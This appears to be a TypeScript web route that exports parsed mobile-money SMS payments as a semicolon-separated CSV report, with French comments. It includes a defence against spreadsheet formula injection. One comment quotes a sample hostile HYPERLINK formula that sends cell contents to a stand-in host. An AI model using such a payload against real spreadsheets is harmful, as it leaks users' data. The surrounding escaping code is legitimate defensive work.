import { chargerDonnees, relie } from "@/lib/serveur";
import { langueServeur } from "@/lib/langue-serveur";
import { erreurApi } from "@noyau/textes/api";
import { jourLocal, type Paiement } from "@noyau/types";
import { FUSEAU } from "@/lib/fuseau";
import type { Langue } from "@noyau/langue";

export const dynamic = "force-dynamic";

// Le bilan en CSV — le même esprit que l'export du robot (storage.py) :
// chaque SMS compris devient une ligne exploitable dans Excel ou la
// comptabilité, et le message d'origine reste en dernière colonne, c'est lui
// qui fait foi.

// Sept jours par défaut, comme la page Analyse et l'export Telegram ;
// `?jours=30` élargit, plafonné pour rester une lecture de bilan.
const JOURS_DEFAUT = 7;
const JOURS_MAX = 90;

// Un champ CSV. Deux protections :
//   1. le texte d'un SMS peut tout contenir — on l'entoure de guillemets dès
//      qu'il porte le séparateur, un guillemet ou un saut de ligne ;
//   2. surtout, un tableur voit une cellule qui commence par « = + - @ »
//      (ou une tabulation) comme une FORMULE. Un SMS piégé
//      « =HYPERLINK("http://vol.example"&A1,"clic") » s'exécuterait alors à
//      l'ouverture du bilan dans Excel, dans le compte du propriétaire.
//      On désamorce en préfixant ces cellules d'une apostrophe : le tableur
//      l'affiche comme du texte, la valeur reste lisible.
function champ(v: string | number | null): string {
  let s = v == null ? "" : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

// La colonne « carte » porte l'ICCID, comme l'export du robot : c'est le
// seul nom d'une puce qui ne change jamais — le libellé « MTN ·8901 » est
// pour les yeux, l'ICCID pour la comptabilité.
const ENTETES: Record<Langue, string[]> = {
  en: ["date", "time", "account", "card", "direction", "amount_fcfa",
    "party", "number", "reference", "balance_after", "receipt", "message"],
  fr: ["date", "heure", "compte", "carte", "sens", "montant_fcfa",
    "tiers", "numero", "reference", "solde_apres", "recu", "message"],
};

const SENS: Record<Langue, Record<Paiement["sens"], string>> = {
  en: { in: "received", out: "sent", "?": "" },
  fr: { in: "reçu", out: "envoyé", "?": "" },
};

export async function GET(req: Request) {
  const langue = await langueServeur();
  if (!relie) {
    return new Response(erreurApi(langue, "nonRelieeBase"), { status: 503 });
  }

  const demande = Number(new URL(req.url).searchParams.get("jours"));
  const jours = Number.isFinite(demande) && demande >= 1
    ? Math.min(Math.round(demande), JOURS_MAX)
    : JOURS_DEFAUT;

  const { paiements } = await chargerDonnees(langue);
  const depuis = Date.now() - jours * 86_400_000;
  const lignes = paiements
    .filter((p) => new Date(p.recuLe).getTime() >= depuis)
    // Du plus ancien au plus récent : un bilan se lit dans l'ordre des jours.
    .reverse();

  const rangs = [
    ENTETES[langue],
    ...lignes.map((p) => [
      p.jour, p.heure, p.sim, p.carte, SENS[langue][p.sens],
      p.montant == null ? "" : String(p.montant),
      p.nom, p.numero, p.reference,
      p.soldeApres == null ? "" : String(p.soldeApres),
      p.recu ?? "", p.smsBrut,
    ]),
  ];
  // Le BOM en tête : sans lui, Excel ouvre l'UTF-8 en dépit du bon sens.
  const csv = "\uFEFF" + rangs.map((r) => r.map(champ).join(";")).join("\r\n") + "\r\n";

  const nom = `bilan-totem-${jourLocal(new Date(), FUSEAU)}.csv`;
  return new Response(csv, {
    headers: {
      "content-type": "text/csv; charset=utf-8",
      "content-disposition": `attachment; filename="${nom}"`,
      "cache-control": "private, no-store",
    },
  });
}
